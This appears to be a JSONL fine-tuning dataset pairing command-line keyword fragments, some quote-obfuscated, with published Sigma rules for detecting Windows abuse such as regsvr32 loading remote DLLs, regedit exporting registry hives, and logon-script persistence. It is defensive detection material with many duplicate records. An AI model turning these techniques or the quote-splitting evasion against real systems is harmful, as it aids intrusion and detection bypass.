{"instruction": "Write Sigma rule to detect payload:", "input": "\\regedit.exe hklm REGEDIT.EXE -E hkey_local_machine", "output": "title: Exports Registry Key To a File\nid: f0e53e89-8d22-46ea-9db5-9d4796ee2f8a\nrelated:\n    - id: 82880171-b475-4201-b811-e9c826cd5eaa\n      type: similar\nstatus: test\ndescription: Detects the export of the target Registry key to a file.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Regedit/\n    - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\nauthor: Oddvar Moe, Sander Wiebing, oscd.community\ndate: 2020-10-07\nmodified: 2024-03-13\ntags:\n    - attack.exfiltration\n    - attack.discovery\n    - attack.t1012\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regedit.exe'\n        - OriginalFileName: 'REGEDIT.EXE'\n    selection_cli:\n        CommandLine|contains|windash: ' -E '\n    filter_1:   # filters to avoid intersection with critical keys rule\n        CommandLine|contains:\n            - 'hklm'\n            - 'hkey_local_machine'\n    filter_2:\n        CommandLine|endswith:\n            - '\\system'\n            - '\\sam'\n            - '\\security'\n    condition: all of selection_* and not all of filter_*\nfields:\n    - ParentImage\n    - CommandLine\nfalsepositives:\n    - Legitimate export of keys\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regedit.exe \\TrustedInstaller.exe \\ProcessHacker.exe", "output": "title: Regedit as Trusted Installer\nid: 883835a7-df45-43e4-bf1d-4268768afda4\nstatus: test\ndescription: Detects a regedit started with TrustedInstaller privileges or by ProcessHacker.exe\nreferences:\n    - https://twitter.com/1kwpeter/status/1397816101455765504\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-05-27\nmodified: 2022-10-09\ntags:\n    - attack.privilege-escalation\n    - attack.t1548\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\regedit.exe'\n        ParentImage|endswith:\n            - '\\TrustedInstaller.exe'\n            - '\\ProcessHacker.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regedit.exe \\TrustedInstaller.exe \"\\ProcessH\"acker.exe", "output": "title: Regedit as Trusted Installer\nid: 883835a7-df45-43e4-bf1d-4268768afda4\nstatus: test\ndescription: Detects a regedit started with TrustedInstaller privileges or by ProcessHacker.exe\nreferences:\n    - https://twitter.com/1kwpeter/status/1397816101455765504\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-05-27\nmodified: 2022-10-09\ntags:\n    - attack.privilege-escalation\n    - attack.t1548\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\regedit.exe'\n        ParentImage|endswith:\n            - '\\TrustedInstaller.exe'\n            - '\\ProcessHacker.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regedit \\TrustedInstaller \\ProcessHacker", "output": "title: Regedit as Trusted Installer\nid: 883835a7-df45-43e4-bf1d-4268768afda4\nstatus: test\ndescription: Detects a regedit started with TrustedInstaller privileges or by ProcessHacker.exe\nreferences:\n    - https://twitter.com/1kwpeter/status/1397816101455765504\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-05-27\nmodified: 2022-10-09\ntags:\n    - attack.privilege-escalation\n    - attack.t1548\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\regedit.exe'\n        ParentImage|endswith:\n            - '\\TrustedInstaller.exe'\n            - '\\ProcessHacker.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regedit.exe \\ProcessHacker.exe \\TrustedInstaller.exe", "output": "title: Regedit as Trusted Installer\nid: 883835a7-df45-43e4-bf1d-4268768afda4\nstatus: test\ndescription: Detects a regedit started with TrustedInstaller privileges or by ProcessHacker.exe\nreferences:\n    - https://twitter.com/1kwpeter/status/1397816101455765504\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-05-27\nmodified: 2022-10-09\ntags:\n    - attack.privilege-escalation\n    - attack.t1548\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\regedit.exe'\n        ParentImage|endswith:\n            - '\\TrustedInstaller.exe'\n            - '\\ProcessHacker.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\register-cimprovider.exe -path dll", "output": "title: DLL Execution Via Register-cimprovider.exe\nid: a2910908-e86f-4687-aeba-76a5f996e652\nstatus: test\ndescription: Detects using register-cimprovider.exe to execute arbitrary dll file.\nreferences:\n    - https://twitter.com/PhilipTsukerman/status/992021361106268161\n    - https://lolbas-project.github.io/lolbas/Binaries/Register-cimprovider/\nauthor: Ivan Dyachkov, Yulia Fomina, oscd.community\ndate: 2020-10-07\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1574\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\register-cimprovider.exe'\n        CommandLine|contains|all:\n            - '-path'\n            - 'dll'\n    condition: selection\nfields:\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"r\"\"e\"\"g\"\"i\"\"s\"\"t\"\"e\"\"r\"\"-\"\"c\"\"i\"\"m\"\"p\"\"r\"\"o\"\"v\"\"i\"\"d\"\"e\"\"r\"\".\"\"e\"\"x\"\"e\" -path dll", "output": "title: DLL Execution Via Register-cimprovider.exe\nid: a2910908-e86f-4687-aeba-76a5f996e652\nstatus: test\ndescription: Detects using register-cimprovider.exe to execute arbitrary dll file.\nreferences:\n    - https://twitter.com/PhilipTsukerman/status/992021361106268161\n    - https://lolbas-project.github.io/lolbas/Binaries/Register-cimprovider/\nauthor: Ivan Dyachkov, Yulia Fomina, oscd.community\ndate: 2020-10-07\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1574\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\register-cimprovider.exe'\n        CommandLine|contains|all:\n            - '-path'\n            - 'dll'\n    condition: selection\nfields:\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\register-cimprovider -path dll", "output": "title: DLL Execution Via Register-cimprovider.exe\nid: a2910908-e86f-4687-aeba-76a5f996e652\nstatus: test\ndescription: Detects using register-cimprovider.exe to execute arbitrary dll file.\nreferences:\n    - https://twitter.com/PhilipTsukerman/status/992021361106268161\n    - https://lolbas-project.github.io/lolbas/Binaries/Register-cimprovider/\nauthor: Ivan Dyachkov, Yulia Fomina, oscd.community\ndate: 2020-10-07\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1574\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\register-cimprovider.exe'\n        CommandLine|contains|all:\n            - '-path'\n            - 'dll'\n    condition: selection\nfields:\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\register-cimprovider.exe -path dll", "output": "title: DLL Execution Via Register-cimprovider.exe\nid: a2910908-e86f-4687-aeba-76a5f996e652\nstatus: test\ndescription: Detects using register-cimprovider.exe to execute arbitrary dll file.\nreferences:\n    - https://twitter.com/PhilipTsukerman/status/992021361106268161\n    - https://lolbas-project.github.io/lolbas/Binaries/Register-cimprovider/\nauthor: Ivan Dyachkov, Yulia Fomina, oscd.community\ndate: 2020-10-07\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1574\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\register-cimprovider.exe'\n        CommandLine|contains|all:\n            - '-path'\n            - 'dll'\n    condition: selection\nfields:\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "UserInitMprLogonScript", "output": "title: Potential Persistence Via Logon Scripts - CommandLine\nid: 21d856f9-9281-4ded-9377-51a1a6e2a432\nrelated:\n    - id: 0a98a10c-685d-4ab0-bddc-b6bdd1d48458\n      type: derived\nstatus: test\ndescription: Detects the addition of a new LogonScript to the registry value \"UserInitMprLogonScript\" for potential persistence\nreferences:\n    - https://cocomelonc.github.io/persistence/2022/12/09/malware-pers-20.html\nauthor: Tom Ueltschi (@c_APT_ure)\ndate: 2019-01-12\nmodified: 2023-06-09\ntags:\n    - attack.persistence\n    - attack.t1037.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: 'UserInitMprLogonScript'\n    condition: selection\nfalsepositives:\n    - Legitimate addition of Logon Scripts via the command line by administrators or third party tools\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "UserInitMprLogonScript", "output": "title: Potential Persistence Via Logon Scripts - CommandLine\nid: 21d856f9-9281-4ded-9377-51a1a6e2a432\nrelated:\n    - id: 0a98a10c-685d-4ab0-bddc-b6bdd1d48458\n      type: derived\nstatus: test\ndescription: Detects the addition of a new LogonScript to the registry value \"UserInitMprLogonScript\" for potential persistence\nreferences:\n    - https://cocomelonc.github.io/persistence/2022/12/09/malware-pers-20.html\nauthor: Tom Ueltschi (@c_APT_ure)\ndate: 2019-01-12\nmodified: 2023-06-09\ntags:\n    - attack.persistence\n    - attack.t1037.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: 'UserInitMprLogonScript'\n    condition: selection\nfalsepositives:\n    - Legitimate addition of Logon Scripts via the command line by administrators or third party tools\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "UserInitMprLogonScript", "output": "title: Potential Persistence Via Logon Scripts - CommandLine\nid: 21d856f9-9281-4ded-9377-51a1a6e2a432\nrelated:\n    - id: 0a98a10c-685d-4ab0-bddc-b6bdd1d48458\n      type: derived\nstatus: test\ndescription: Detects the addition of a new LogonScript to the registry value \"UserInitMprLogonScript\" for potential persistence\nreferences:\n    - https://cocomelonc.github.io/persistence/2022/12/09/malware-pers-20.html\nauthor: Tom Ueltschi (@c_APT_ure)\ndate: 2019-01-12\nmodified: 2023-06-09\ntags:\n    - attack.persistence\n    - attack.t1037.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: 'UserInitMprLogonScript'\n    condition: selection\nfalsepositives:\n    - Legitimate addition of Logon Scripts via the command line by administrators or third party tools\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "ControlSet services \\ImagePath \\FailureCommand \\ServiceDll", "output": "title: Potential Privilege Escalation via Service Permissions Weakness\nid: 0f9c21f1-6a73-4b0e-9809-cb562cb8d981\nstatus: test\ndescription: Detect modification of services configuration (ImagePath, FailureCommand and ServiceDLL) in registry by processes with Medium integrity level\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment\n    - https://pentestlab.blog/2017/03/31/insecure-registry-permissions/\nauthor: Teymur Kheirkhabarov\ndate: 2019-10-26\nmodified: 2024-12-01\ntags:\n    - attack.privilege-escalation\n    - attack.t1574.011\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        IntegrityLevel:\n            - 'Medium'\n            - 'S-1-16-8192'\n        CommandLine|contains|all:\n            - 'ControlSet'\n            - 'services'\n        CommandLine|contains:\n            - '\\ImagePath'\n            - '\\FailureCommand'\n            - '\\ServiceDll'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "ControlSet services \\\"\\Imag\\\"ePath \\FailureCommand \\ServiceDll", "output": "title: Potential Privilege Escalation via Service Permissions Weakness\nid: 0f9c21f1-6a73-4b0e-9809-cb562cb8d981\nstatus: test\ndescription: Detect modification of services configuration (ImagePath, FailureCommand and ServiceDLL) in registry by processes with Medium integrity level\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment\n    - https://pentestlab.blog/2017/03/31/insecure-registry-permissions/\nauthor: Teymur Kheirkhabarov\ndate: 2019-10-26\nmodified: 2024-12-01\ntags:\n    - attack.privilege-escalation\n    - attack.t1574.011\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        IntegrityLevel:\n            - 'Medium'\n            - 'S-1-16-8192'\n        CommandLine|contains|all:\n            - 'ControlSet'\n            - 'services'\n        CommandLine|contains:\n            - '\\ImagePath'\n            - '\\FailureCommand'\n            - '\\ServiceDll'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "ControlSet services \\ImagePath \\ServiceDll \\FailureCommand", "output": "title: Potential Privilege Escalation via Service Permissions Weakness\nid: 0f9c21f1-6a73-4b0e-9809-cb562cb8d981\nstatus: test\ndescription: Detect modification of services configuration (ImagePath, FailureCommand and ServiceDLL) in registry by processes with Medium integrity level\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment\n    - https://pentestlab.blog/2017/03/31/insecure-registry-permissions/\nauthor: Teymur Kheirkhabarov\ndate: 2019-10-26\nmodified: 2024-12-01\ntags:\n    - attack.privilege-escalation\n    - attack.t1574.011\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        IntegrityLevel:\n            - 'Medium'\n            - 'S-1-16-8192'\n        CommandLine|contains|all:\n            - 'ControlSet'\n            - 'services'\n        CommandLine|contains:\n            - '\\ImagePath'\n            - '\\FailureCommand'\n            - '\\ServiceDll'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regsvr32.exe -i: -n", "output": "title: Potential Regsvr32 Commandline Flag Anomaly\nid: b236190c-1c61-41e9-84b3-3fe03f6d76b0\nstatus: test\ndescription: Detects a potential command line flag anomaly related to \"regsvr32\" in which the \"/i\" flag is used without the \"/n\" which should be uncommon.\nreferences:\n    - https://twitter.com/sbousseaden/status/1282441816986484737?s=12\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-07-13\nmodified: 2024-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\regsvr32.exe'\n        CommandLine|contains|windash: ' -i:'\n    filter_main_flag:\n        CommandLine|contains|windash: ' -n '\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Administrator typo might cause some false positives\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"r\"\"e\"\"g\"\"s\"\"v\"\"r\"\"3\"\"2\"\".\"\"e\"\"x\"\"e\" -i: -n", "output": "title: Potential Regsvr32 Commandline Flag Anomaly\nid: b236190c-1c61-41e9-84b3-3fe03f6d76b0\nstatus: test\ndescription: Detects a potential command line flag anomaly related to \"regsvr32\" in which the \"/i\" flag is used without the \"/n\" which should be uncommon.\nreferences:\n    - https://twitter.com/sbousseaden/status/1282441816986484737?s=12\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-07-13\nmodified: 2024-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\regsvr32.exe'\n        CommandLine|contains|windash: ' -i:'\n    filter_main_flag:\n        CommandLine|contains|windash: ' -n '\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Administrator typo might cause some false positives\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regsvr32 -i: -n", "output": "title: Potential Regsvr32 Commandline Flag Anomaly\nid: b236190c-1c61-41e9-84b3-3fe03f6d76b0\nstatus: test\ndescription: Detects a potential command line flag anomaly related to \"regsvr32\" in which the \"/i\" flag is used without the \"/n\" which should be uncommon.\nreferences:\n    - https://twitter.com/sbousseaden/status/1282441816986484737?s=12\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-07-13\nmodified: 2024-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\regsvr32.exe'\n        CommandLine|contains|windash: ' -i:'\n    filter_main_flag:\n        CommandLine|contains|windash: ' -n '\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Administrator typo might cause some false positives\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regsvr32.exe -n -i:", "output": "title: Potential Regsvr32 Commandline Flag Anomaly\nid: b236190c-1c61-41e9-84b3-3fe03f6d76b0\nstatus: test\ndescription: Detects a potential command line flag anomaly related to \"regsvr32\" in which the \"/i\" flag is used without the \"/n\" which should be uncommon.\nreferences:\n    - https://twitter.com/sbousseaden/status/1282441816986484737?s=12\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-07-13\nmodified: 2024-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\regsvr32.exe'\n        CommandLine|contains|windash: ' -i:'\n    filter_main_flag:\n        CommandLine|contains|windash: ' -n '\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Administrator typo might cause some false positives\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regsvr32.exe REGSVR32.EXE /i:http://1 /i:http://2 /i:http://3 /i:http://4 /i:http://5 /i:http://6 /i:http://7 /i:http://8 /i:http://9 /i:https://1 /i:https://2 /i:https://3 /i:https://4 /i:https://5 /i:https://6 /i:https://7 /i:https://8 /i:https://9 -i:http://1 -i:http://2 -i:http://3 -i:http://4 -i:http://5 -i:http://6 -i:http://7 -i:http://8 -i:http://9 -i:https://1 -i:https://2 -i:https://3 -i:https://4 -i:https://5 -i:https://6 -i:https://7 -i:https://8 -i:https://9", "output": "title: Potentially Suspicious Regsvr32 HTTP IP Pattern\nid: 2dd2c217-bf68-437a-b57c-fe9fd01d5de8\nstatus: test\ndescription: Detects regsvr32 execution to download and install DLLs located remotely where the address is an IP address.\nreferences:\n    - https://twitter.com/mrd0x/status/1461041276514623491\n    - https://twitter.com/tccontre18/status/1480950986650832903\n    - https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-01-11\nmodified: 2023-05-24\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regsvr32.exe'\n        - OriginalFileName: 'REGSVR32.EXE'\n    selection_ip:\n        CommandLine|contains:\n            - ' /i:http://1'\n            - ' /i:http://2'\n            - ' /i:http://3'\n            - ' /i:http://4'\n            - ' /i:http://5'\n            - ' /i:http://6'\n            - ' /i:http://7'\n            - ' /i:http://8'\n            - ' /i:http://9'\n            - ' /i:https://1'\n            - ' /i:https://2'\n            - ' /i:https://3'\n            - ' /i:https://4'\n            - ' /i:https://5'\n            - ' /i:https://6'\n            - ' /i:https://7'\n            - ' /i:https://8'\n            - ' /i:https://9'\n            - ' -i:http://1'\n            - ' -i:http://2'\n            - ' -i:http://3'\n            - ' -i:http://4'\n            - ' -i:http://5'\n            - ' -i:http://6'\n            - ' -i:http://7'\n            - ' -i:http://8'\n            - ' -i:http://9'\n            - ' -i:https://1'\n            - ' -i:https://2'\n            - ' -i:https://3'\n            - ' -i:https://4'\n            - ' -i:https://5'\n            - ' -i:https://6'\n            - ' -i:https://7'\n            - ' -i:https://8'\n            - ' -i:https://9'\n    condition: all of selection_*\nfalsepositives:\n    - FQDNs that start with a number such as \"7-Zip\"\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regsvr32.exe REGSVR32.EXE /i:http://1 /i:http://2 /i:http://3 /i:http://4 /i:http://5 /i:http://6 /i:http://7 /i:http://8 /i:http://9 /i:https://1 /i:https://2 /i:https://3 /i:https://4 /i:https://5 /i:https://6 /i:https://7 /i:https://8 /i:https://9 -i:http://1 -i:http://2 -i:http://3 -i:http://4 -i:http://5 -i:http://6 -i:http://7 \\\"-i:http://8\\\" -i:http://9 -i:https://1 -i:https://2 -i:https://3 -i:https://4 -i:https://5 -i:https://6 -i:https://7 -i:https://8 -i:https://9", "output": "title: Potentially Suspicious Regsvr32 HTTP IP Pattern\nid: 2dd2c217-bf68-437a-b57c-fe9fd01d5de8\nstatus: test\ndescription: Detects regsvr32 execution to download and install DLLs located remotely where the address is an IP address.\nreferences:\n    - https://twitter.com/mrd0x/status/1461041276514623491\n    - https://twitter.com/tccontre18/status/1480950986650832903\n    - https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-01-11\nmodified: 2023-05-24\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regsvr32.exe'\n        - OriginalFileName: 'REGSVR32.EXE'\n    selection_ip:\n        CommandLine|contains:\n            - ' /i:http://1'\n            - ' /i:http://2'\n            - ' /i:http://3'\n            - ' /i:http://4'\n            - ' /i:http://5'\n            - ' /i:http://6'\n            - ' /i:http://7'\n            - ' /i:http://8'\n            - ' /i:http://9'\n            - ' /i:https://1'\n            - ' /i:https://2'\n            - ' /i:https://3'\n            - ' /i:https://4'\n            - ' /i:https://5'\n            - ' /i:https://6'\n            - ' /i:https://7'\n            - ' /i:https://8'\n            - ' /i:https://9'\n            - ' -i:http://1'\n            - ' -i:http://2'\n            - ' -i:http://3'\n            - ' -i:http://4'\n            - ' -i:http://5'\n            - ' -i:http://6'\n            - ' -i:http://7'\n            - ' -i:http://8'\n            - ' -i:http://9'\n            - ' -i:https://1'\n            - ' -i:https://2'\n            - ' -i:https://3'\n            - ' -i:https://4'\n            - ' -i:https://5'\n            - ' -i:https://6'\n            - ' -i:https://7'\n            - ' -i:https://8'\n            - ' -i:https://9'\n    condition: all of selection_*\nfalsepositives:\n    - FQDNs that start with a number such as \"7-Zip\"\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regsvr32 REGSVR32 /i:http://1 /i:http://2 /i:http://3 /i:http://4 /i:http://5 /i:http://6 /i:http://7 /i:http://8 /i:http://9 /i:https://1 /i:https://2 /i:https://3 /i:https://4 /i:https://5 /i:https://6 /i:https://7 /i:https://8 /i:https://9 -i:http://1 -i:http://2 -i:http://3 -i:http://4 -i:http://5 -i:http://6 -i:http://7 -i:http://8 -i:http://9 -i:https://1 -i:https://2 -i:https://3 -i:https://4 -i:https://5 -i:https://6 -i:https://7 -i:https://8 -i:https://9", "output": "title: Potentially Suspicious Regsvr32 HTTP IP Pattern\nid: 2dd2c217-bf68-437a-b57c-fe9fd01d5de8\nstatus: test\ndescription: Detects regsvr32 execution to download and install DLLs located remotely where the address is an IP address.\nreferences:\n    - https://twitter.com/mrd0x/status/1461041276514623491\n    - https://twitter.com/tccontre18/status/1480950986650832903\n    - https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-01-11\nmodified: 2023-05-24\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regsvr32.exe'\n        - OriginalFileName: 'REGSVR32.EXE'\n    selection_ip:\n        CommandLine|contains:\n            - ' /i:http://1'\n            - ' /i:http://2'\n            - ' /i:http://3'\n            - ' /i:http://4'\n            - ' /i:http://5'\n            - ' /i:http://6'\n            - ' /i:http://7'\n            - ' /i:http://8'\n            - ' /i:http://9'\n            - ' /i:https://1'\n            - ' /i:https://2'\n            - ' /i:https://3'\n            - ' /i:https://4'\n            - ' /i:https://5'\n            - ' /i:https://6'\n            - ' /i:https://7'\n            - ' /i:https://8'\n            - ' /i:https://9'\n            - ' -i:http://1'\n            - ' -i:http://2'\n            - ' -i:http://3'\n            - ' -i:http://4'\n            - ' -i:http://5'\n            - ' -i:http://6'\n            - ' -i:http://7'\n            - ' -i:http://8'\n            - ' -i:http://9'\n            - ' -i:https://1'\n            - ' -i:https://2'\n            - ' -i:https://3'\n            - ' -i:https://4'\n            - ' -i:https://5'\n            - ' -i:https://6'\n            - ' -i:https://7'\n            - ' -i:https://8'\n            - ' -i:https://9'\n    condition: all of selection_*\nfalsepositives:\n    - FQDNs that start with a number such as \"7-Zip\"\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regsvr32.exe REGSVR32.EXE /i:http://1 /i:http://2 /i:http://3 /i:http://4 /i:http://5 /i:http://6 /i:http://7 /i:http://8 /i:http://9 /i:https://1 /i:https://2 /i:https://3 /i:https://4 /i:https://5 /i:https://6 /i:https://7 /i:https://8 /i:https://9 -i:http://1 -i:http://2 -i:http://3 -i:http://4 -i:http://5 -i:http://6 -i:http://7 -i:http://8 -i:http://9 -i:https://1 -i:https://2 -i:https://3 -i:https://4 -i:https://5 -i:https://6 -i:https://7 -i:https://8 -i:https://9", "output": "title: Potentially Suspicious Regsvr32 HTTP IP Pattern\nid: 2dd2c217-bf68-437a-b57c-fe9fd01d5de8\nstatus: test\ndescription: Detects regsvr32 execution to download and install DLLs located remotely where the address is an IP address.\nreferences:\n    - https://twitter.com/mrd0x/status/1461041276514623491\n    - https://twitter.com/tccontre18/status/1480950986650832903\n    - https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-01-11\nmodified: 2023-05-24\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regsvr32.exe'\n        - OriginalFileName: 'REGSVR32.EXE'\n    selection_ip:\n        CommandLine|contains:\n            - ' /i:http://1'\n            - ' /i:http://2'\n            - ' /i:http://3'\n            - ' /i:http://4'\n            - ' /i:http://5'\n            - ' /i:http://6'\n            - ' /i:http://7'\n            - ' /i:http://8'\n            - ' /i:http://9'\n            - ' /i:https://1'\n            - ' /i:https://2'\n            - ' /i:https://3'\n            - ' /i:https://4'\n            - ' /i:https://5'\n            - ' /i:https://6'\n            - ' /i:https://7'\n            - ' /i:https://8'\n            - ' /i:https://9'\n            - ' -i:http://1'\n            - ' -i:http://2'\n            - ' -i:http://3'\n            - ' -i:http://4'\n            - ' -i:http://5'\n            - ' -i:http://6'\n            - ' -i:http://7'\n            - ' -i:http://8'\n            - ' -i:http://9'\n            - ' -i:https://1'\n            - ' -i:https://2'\n            - ' -i:https://3'\n            - ' -i:https://4'\n            - ' -i:https://5'\n            - ' -i:https://6'\n            - ' -i:https://7'\n            - ' -i:https://8'\n            - ' -i:https://9'\n    condition: all of selection_*\nfalsepositives:\n    - FQDNs that start with a number such as \"7-Zip\"\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regsvr32.exe REGSVR32.EXE /i -i ftp http", "output": "title: Potentially Suspicious Regsvr32 HTTP/FTP Pattern\nid: 867356ee-9352-41c9-a8f2-1be690d78216\nrelated:\n    - id: 8e2b24c9-4add-46a0-b4bb-0057b4e6187d\n      type: obsolete\nstatus: test\ndescription: Detects regsvr32 execution to download/install/register new DLLs that are hosted on Web or FTP servers.\nreferences:\n    - https://twitter.com/mrd0x/status/1461041276514623491\n    - https://twitter.com/tccontre18/status/1480950986650832903\n    - https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/\nauthor: Florian Roth (Nextron Systems)\ndate: 2023-05-24\nmodified: 2023-05-26\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regsvr32.exe'\n        - OriginalFileName: 'REGSVR32.EXE'\n    selection_flag:\n        CommandLine|contains:\n            - ' /i'\n            - ' -i'\n    selection_protocol:\n        CommandLine|contains:\n            - 'ftp'\n            - 'http'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\regsvr32.exe REGSVR32.EXE /i -i ftp \"h\"\"t\"\"t\"\"p\"", "output": "title: Potentially Suspicious Regsvr32 HTTP/FTP Pattern\nid: 867356ee-9352-41c9-a8f2-1be690d78216\nrelated:\n    - id: 8e2b24c9-4add-46a0-b4bb-0057b4e6187d\n      type: obsolete\nstatus: test\ndescription: Detects regsvr32 execution to download/install/register new DLLs that are hosted on Web or FTP servers.\nreferences:\n    - https://twitter.com/mrd0x/status/1461041276514623491\n    - https://twitter.com/tccontre18/status/1480950986650832903\n    - https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/\nauthor: Florian Roth (Nextron Systems)\ndate: 2023-05-24\nmodified: 2023-05-26\ntags:\n    - attack.defense-evasion\n    - attack.t1218.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\regsvr32.exe'\n        - OriginalFileName: 'REGSVR32.EXE'\n    selection_flag:\n        CommandLine|contains:\n            - ' /i'\n            - ' -i'\n    selection_protocol:\n        CommandLine|contains:\n            - 'ftp'\n            - 'http'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
